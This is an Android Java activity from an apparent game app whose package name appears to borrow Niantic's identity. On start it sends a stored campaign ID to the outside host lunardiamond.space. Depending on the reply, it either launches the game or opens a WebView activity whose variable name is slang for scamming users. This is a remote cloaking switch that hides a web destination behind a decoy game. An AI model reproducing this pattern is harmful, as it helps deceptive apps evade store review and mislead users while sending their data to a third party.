package com.nianticlabs.pikmi;

import static com.nianticlabs.pikmi.MainActivity.CPN_ONE;

import androidx.appcompat.app.AppCompatActivity;

import android.content.Intent;
import android.os.AsyncTask;
import android.os.Bundle;
import android.widget.TextView;

import com.orhanobut.hawk.Hawk;

import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;

public class NeoFLD extends AppCompatActivity {


    TextView prikol;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_neo_fld);


        prikol = findViewById(R.id.inviteTxt);

        new asyncF().execute();
    }

    public class asyncF extends AsyncTask<Void, Void, Void> {


        String jsoup;

        String hawk = Hawk.get(CPN_ONE);

        String linkfltr = "https://lunardiamond.space/fj78K?";


        String odone = "sub_id_1=";



        String ddune = linkfltr + odone + hawk;


        @Override
        protected Void doInBackground(Void... voids) {
            try {

                Document doc = Jsoup.connect(ddune).get();


                jsoup = doc.text();
            } catch (Exception e) {
                e.printStackTrace();
            }


            return null;
        }


        @Override
        protected void onPostExecute(Void aVoid) {
            super.onPostExecute(aVoid);
            prikol.setText(jsoup);

            Intent gameitself = new Intent(getApplicationContext(), LDS.class);

            Intent webviewdlyanaeba = new Intent(getApplicationContext(), WLD.class);
            if (jsoup.equals("9Hj8")) {
                startActivity(gameitself);
            } else {
                startActivity(webviewdlyanaeba);
            }
            overridePendingTransition(android.R.anim.fade_in, android.R.anim.fade_out);
            finish();
        }

    }
}